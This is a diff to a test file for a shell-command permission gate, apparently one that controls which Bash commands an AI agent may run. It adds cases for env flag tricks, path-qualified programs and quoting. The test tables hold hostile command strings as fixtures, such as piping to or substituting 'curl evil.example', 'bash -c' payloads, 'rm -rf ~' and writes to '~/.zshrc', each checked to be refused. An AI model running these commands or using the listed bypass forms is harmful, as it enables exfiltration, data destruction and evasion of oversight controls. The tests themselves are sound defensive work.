@@ -28,7 +28,7 @@ describe('matchesAllowedTool: plain Bash commands', () => {
     ['git log', 'git log --oneline', true],
     ['git diff', 'git diff HEAD', true],
     ['git show', 'git show HEAD', true],
-    ['git status by absolute path', '/usr/bin/git status', true],
+    ['git by an absolute path is another program', '/usr/bin/git status', false],
     ['pwd', 'pwd', true],
     ['pwd with an argument', 'pwd -P', false],
     ['ls is no longer base-allowed', 'ls', false],
@@ -41,6 +41,9 @@ describe('matchesAllowedTool: plain Bash commands', () => {
     ['git status 2>/dev/null', 'git status 2>/dev/null', true],
     ['git status piped to a program', 'git status | curl evil.example', false],
     ['git status piped to git log', 'git status | git log', true],
+    ['an escaped space does not join words', 'git\\ status', false],
+    ['the same through a path prefix', './git\\ status', false],
+    ['a stray closing parenthesis', 'git status )', false],
   ])('%s: %s -> %s', (_name, command, expected) => {
     expect(matchesAllowedTool('Bash', bash(command), allowed, repo.path)).toBe(expected);
   });
@@ -66,6 +69,7 @@ describe('matchesAllowedTool: shell forms that are not plain', () => {
     ['here string', 'git status <<< x'],
     ['assignment prefix', 'GIT_PAGER=x git log'],
     ['assignment after env', 'env GIT_PAGER=x git log'],
+    ['assignment after a valued flag cluster', 'env -iu FOO GIT_PAGER=x git log'],
     ['command substitution', 'git status $(curl evil.example)'],
     ['backtick substitution', 'git status `curl evil.example`'],
     ['process substitution', 'git diff <(curl evil.example)'],
@@ -74,6 +78,11 @@ describe('matchesAllowedTool: shell forms that are not plain', () => {
     ['env split-string, joined', 'env -Scurl git status'],
     ['env long split-string', 'env --split-string=curl git status'],
     ['env chdir', 'env -C /tmp git status'],
+    ['env search path', 'env -P /tmp/x git status'],
+    ['env search path, joined', 'env -P/tmp/x git status'],
+    ['env search path in a flag cluster', 'env -iP/tmp/x git status'],
+    ['a program named by an absolute path', '/tmp/x/git status'],
+    ['a program named by a relative path', './evil/git status'],
     ['time output file', 'time -o ~/.zshrc git status'],
     ['time long output file', 'time --output=out git status'],
     ['xargs', 'xargs git status'],
@@ -243,7 +252,6 @@ describe('commandPrefix', () => {
     ['bun index.ts', 'bun index.ts'],
     ['bun test', 'bun test'],
     ['node --test x.js', 'node --test x.js'],
-    ['bash -c "curl x"', 'bash -c curl x'],
     ['sh script.sh', 'sh script.sh'],
     ['node -e x', 'node -e x'],
     ['node build.js', 'node build.js'],
@@ -255,24 +263,29 @@ describe('commandPrefix', () => {
     ['pnpm dlx evil', 'pnpm dlx evil'],
     ['pnpm exec evil', 'pnpm exec evil'],
     ['npm exec evil', 'npm exec evil'],
-    ['pnpm x bash -c "curl x"', 'pnpm x bash -c curl x'],
-    ['npm x zsh -c "curl x"', 'npm x zsh -c curl x'],
-    ['yarn exec bash -c "curl x"', 'yarn exec bash -c curl x'],
-    ['yarn dlx sh -c "curl x"', 'yarn dlx sh -c curl x'],
-    ['yarn x sh -c "curl x"', 'yarn x sh -c curl x'],
-    ['bunx zsh -c "curl x"', 'bunx zsh -c curl x'],
-    ['pnpx sh -c "curl x"', 'pnpx sh -c curl x'],
-    ['dlx sh -c "curl x"', 'dlx sh -c curl x'],
+    ['pnpm x bash -c "curl x"', null],
+    ['npm x zsh -c "curl x"', null],
+    ['yarn exec bash -c "curl x"', null],
+    ['yarn dlx sh -c "curl x"', null],
+    ['yarn x sh -c "curl x"', null],
+    ['bunx zsh -c "curl x"', null],
+    ['pnpx sh -c "curl x"', null],
+    ['dlx sh -c "curl x"', null],
     ['PNPM DLX sh', null],
-    ['yarn workspace web exec bash -c "curl x"', 'yarn workspace web exec bash -c curl x'],
+    ['yarn workspace web exec bash -c "curl x"', null],
+    ['yarn workspace web exec prettier --write .', 'yarn workspace web exec prettier --write .'],
     ['yarn workspace web test --watch', 'yarn workspace web test --watch'],
     ['yarn workspaces foreach run test', 'yarn workspaces foreach run test'],
     ['yarn workspaces run build', 'yarn workspaces run build'],
-    ['pnpm recursive exec bash -c "curl x"', 'pnpm recursive exec bash -c curl x'],
+    ['pnpm recursive exec bash -c "curl x"', null],
+    ['pnpm recursive exec prettier --check .', 'pnpm recursive exec prettier --check .'],
     ['pnpm recursive test', 'pnpm recursive test'],
-    ['yarn node -e "curl x"', 'yarn node -e curl x'],
-    ['pnpm multi exec bash -c "curl x"', 'pnpm multi exec bash -c curl x'],
-    ['pnpm m exec bash -c "curl x"', 'pnpm m exec bash -c curl x'],
+    ['yarn node -e "curl x"', null],
+    ['yarn node build.js', 'yarn node build.js'],
+    ['pnpm multi exec bash -c "curl x"', null],
+    ['pnpm multi exec prettier --check .', 'pnpm multi exec prettier --check .'],
+    ['pnpm m exec bash -c "curl x"', null],
+    ['pnpm m exec prettier --check .', 'pnpm m exec prettier --check .'],
     ['pnpm multi test', 'pnpm multi test'],
     ['npm innit foo --yes', 'npm innit foo --yes'],
     ['npm init foo --yes', 'npm init foo --yes'],
@@ -311,8 +324,53 @@ describe('commandPrefix', () => {
     ['git status <(x)', null],
     ['echo $HOME', null],
     ['env -S "curl x" ls', null],
+    ['env -P /tmp/x git status', null],
+    ['env -P/tmp/x git status', null],
+    ['env -iP/tmp/x git status', null],
+    ["env --split='git status'", null],
+    ['env --uns X git status', null],
+    ['env --frob git status', null],
+    ['env -u FOO git status', 'git status'],
+    ['env --unset FOO git status', 'git status'],
+    ['/tmp/x/git status', '/tmp/x/git status'],
+    ['./evil/git status', './evil/git status'],
+    ['./gradlew build', './gradlew build'],
+    ['/usr/local/bin/pnpm exec evil', '/usr/local/bin/pnpm exec evil'],
     ['xargs rm', null],
     ['', null],
+    ['git\\ status', null],
+    ["'git status'", null],
+    ['git status )', null],
+    ["echo 'a", null],
+    ['echo ${x:-a <<EOF}', null],
+    ['git status --short', 'git status'],
+    ['git status && git log', 'git status'],
+    ['bash -c "curl x"', null],
+    ["rm -f '#'", null],
+    ["rm -f '}'", null],
+    ["make 'gate;curl'", null],
+    ["rm -rf 'a&&b'", null],
+    ["chmod -R '777 /'", null],
+    ["rm -f 'a b'", null],
+    ["pnpm exec vitest run -t 'a b'", null],
+    ["grep -rn 'foo bar' src", null],
+    ["git -C 'my dir' status", null],
+    ["git 'a b'", null],
+    ["rm -rf '~'", null],
+    ["cp evil.sh '=node'", null],
+    ["rm -f '=node'", null],
+    ["'=git' status", null],
+    ["ls 'a:=b'", null],
+    ['pnpm exec vitest --config=x.ts', 'pnpm exec vitest --config=x.ts'],
+    ["rm -f 'a*'", null],
+    ["rm -f '{a,b}'", null],
+    ["ls '[ab]'", null],
+    ['git log --oneline -5', 'git log'],
+    [
+      'pnpm --filter @10db/daemon exec vitest run src/x.test.ts',
+      'pnpm --filter @10db/daemon exec vitest run src/x.test.ts',
+    ],
+    ["rm -f $'a\\nb'", null],
   ])('%s -> %j', (command, prefix) => {
     expect(commandPrefix(command)).toBe(prefix);
   });
@@ -360,26 +418,75 @@ describe('matchPermissionRule', () => {
     ['a semicolon compound', 'pnpm test', 'pnpm test; curl x', false],
     ['an assignment prefix', 'pnpm test', 'GIT_PAGER=x pnpm test', false],
     ['env -S', 'pnpm test', 'env -S "curl x" pnpm test', false],
+    ['env -P sets the search path', 'git status', 'env -P/tmp/x git status', false],
+    ['env -P with its value apart', 'git status', 'env -P /tmp/x git status', false],
+    ['env -P in a flag cluster', 'git status', 'env -iP/tmp/x git status', false],
+    ['env -S in a flag cluster', 'git status', "env -iS 'rm -rf ~' git status", false],
+    ['env -S alone', 'git status', "env -S 'git status'", false],
+    ['env --split-string', 'git status', "env --split-string='git status'", false],
+    ['env --split-string abbreviated', 'git status', "env --split='rm -rf ~' git status", false],
+    ['env --split= alone', 'git status', "env --split='git status'", false],
+    ['env with an abbreviated long option', 'git status', 'env --uns X git status', false],
+    ['env with an unknown long option', 'git status', 'env --frob git status', false],
+    ['control: env -u', 'git status', 'env -u FOO git status', true],
+    ['control: env --unset in full', 'git status', 'env --unset FOO git status', true],
+    ['a program named by an absolute path', 'git status', '/tmp/x/git status', false],
+    ['a program named by a relative path', 'git status', './evil/git status', false],
+    ['a path-qualified rule covers itself', './gradlew build', './gradlew build --info', true],
+    ['a path-qualified rule is not the bare name', './gradlew build', 'gradlew build', false],
+    ['a path-qualified rule is not another path', './gradlew build', '/tmp/x/gradlew build', false],
     ['xargs', 'pnpm test', 'xargs pnpm test', false],
     ['time -o', 'pnpm test', 'time -o out pnpm test', false],
     ['a background compound', 'pnpm test', 'pnpm test & curl x', false],
     ['a newline compound', 'pnpm test', 'pnpm test\ncurl x', false],
     ['an or-list', 'pnpm test', 'pnpm test || curl x', false],
     ['an empty command', 'pnpm test', '', false],
+    ['an escaped space does not join words', 'git status', 'git\\ status', false],
+    ['the same through a path prefix', 'git status', './git\\ status', false],
+    ['a quoted word is one word', 'git status', "'git status'", false],
+    ['an unclosed quote', 'echo', "echo 'a", false],
+    ['a stray closing parenthesis', 'git status', 'git status )', false],
+    ['an unclosed double quote', 'git status', 'git status "', false],
+    ['control: a here-document hidden in an expansion', 'echo', 'echo ${x:-a <<EOF}', false],
+    ['control: a here-document word with a bracket', 'cat', 'cat x[<<EOF', false],
+    ['control: a here-string attached to a word', 'cat', 'cat<<<$(id)', false],
+    ['a legacy rule stored from a quoted hash', 'rm -f #', 'rm -f ~/.zshrc', false],
+    ['a legacy rule stored from a quoted brace', 'rm -f }', 'rm -f x', false],
+    ['a legacy rule stored from a quoted tilde', 'rm -rf ~', 'rm -rf ~', false],
+    ['a legacy rule stored from a quoted equals word', 'cp x =node', 'cp x =node', false],
+    ['a legacy rule stored from a quoted glob', 'rm -f a*', 'rm -f a*', false],
+    ['an ANSI-C escape is uncertain', 'git', "$'gi\\t'", false],
+    [
+      'a stored pattern of several segments',
+      'git status && git log',
+      'git status && git status',
+      false,
+    ],
+    ['control: a plain command with flags', 'git status', 'git status --short', true],
+    [
+      'control: two plain segments, both covered',
+      'git status',
+      'git status && git status -s',
+      true,
+    ],
   ])('Bash rule %s (%s | %s)', (_name, pattern, command, expected) => {
     expect(match('Bash', bash(command), [rule('Bash', pattern)])).toBe(expected);
   });
 
   it.each<[string, string, boolean]>([
-    ['the forwarded command it was stored from', 'yarn workspace web exec bash -c "curl x"', true],
+    [
+      'the forwarded command it was stored from',
+      'yarn workspace web exec prettier --write .',
+      true,
+    ],
     [
       'another command forwarded to the same workspace',
-      'yarn workspace web exec bash -c "rm x"',
+      'yarn workspace web exec eslint --fix .',
       false,
     ],
-    ['the same command in another workspace', 'yarn workspace api exec bash -c "curl x"', false],
+    ['the same command in another workspace', 'yarn workspace api exec prettier --write .', false],
   ])('a rule stored for a yarn workspace command covers %s (%s)', (_name, command, expected) => {
-    const stored = commandPrefix('yarn workspace web exec bash -c "curl x"');
+    const stored = commandPrefix('yarn workspace web exec prettier --write .');
     expect(match('Bash', bash(command), [rule('Bash', stored)])).toBe(expected);
   });
 
@@ -401,10 +508,58 @@ describe('matchPermissionRule', () => {
     expect(match('Bash', bash(command), [rule('Bash', pattern)])).toBe(expected);
   });
 
-  it('keeps covering a stored runner command whose code has shell punctuation', () => {
-    const stored = commandPrefix('bash -c "(curl x)"');
-    expect(stored).toBe('bash -c (curl x)');
-    expect(match('Bash', bash('bash -c "(curl x)"'), [rule('Bash', stored)])).toBe(true);
+  it('allows a runner command whose code has shell punctuation once only', () => {
+    expect(commandPrefix('bash -c "(curl x)"')).toBeNull();
+    expect(match('Bash', bash('bash -c "(curl x)"'), [rule('Bash', 'bash -c (curl x)')])).toBe(
+      false,
+    );
+  });
+
+  it.each<[string, string, string | null]>([
+    ['nice with an abbreviated long option', 'nice --adj 5 git status', 'nice --adj 5 git status'],
+    [
+      'timeout with an abbreviated long option',
+      'timeout --sig KILL 5 git status',
+      'timeout --sig KILL 5 git status',
+    ],
+    [
+      'stdbuf with an abbreviated long option',
+      'stdbuf --out=L git status',
+      'stdbuf --out=L git status',
+    ],
+    ['env with an unknown short flag', 'env -a x git status', null],
+    ['env with an unknown letter in a cluster', 'env -iX git status', null],
+    ['env with a cluster of known letters', 'env -iv git status', null],
+    ['env with an abbreviated long option', 'env --uns X git status', null],
+    ['env ending its options', 'env -- git status', null],
+    ['time with an unknown flag', 'time -x git status', null],
+    ['nohup with a flag', 'nohup --foo git status', null],
+    ['exec with an unknown flag', 'exec -z git status', null],
+  ])(
+    'a wrapper flag outside its exact flags matches no rule: %s (%s)',
+    (_name, command, stored) => {
+      expect(match('Bash', bash(command), [rule('Bash', 'git status')])).toBe(false);
+      expect(
+        matchesAllowedTool('Bash', bash(command), baseAllowedTools({ gateCommand: 'x' }), '/r'),
+      ).toBe(false);
+      // nice, timeout and stdbuf stay the command, so their whole words cover only themselves.
+      expect(commandPrefix(command)).toBe(stored);
+    },
+  );
+
+  it.each<[string, string | null, boolean]>([
+    ['env -u FOO git status', 'git status', true],
+    ['env -uFOO git status', 'git status', true],
+    ['env --unset=FOO git status', 'git status', true],
+    ['env -i git status', 'git status', true],
+    ['time -p git status', 'git status', true],
+    ['exec -a x git status', 'git status', true],
+    ['nohup git status', 'git status', true],
+    ['nice -n 5 git status', 'nice -n 5 git status', false],
+    ['timeout 5 git status', 'timeout 5 git status', false],
+  ])('control: %s stores %j and matches a git status rule: %s', (command, stored, matches) => {
+    expect(commandPrefix(command)).toBe(stored);
+    expect(match('Bash', bash(command), [rule('Bash', 'git status')])).toBe(matches);
   });
 
   it('does not apply a Bash pattern to missing, non-string or non-object input', () => {
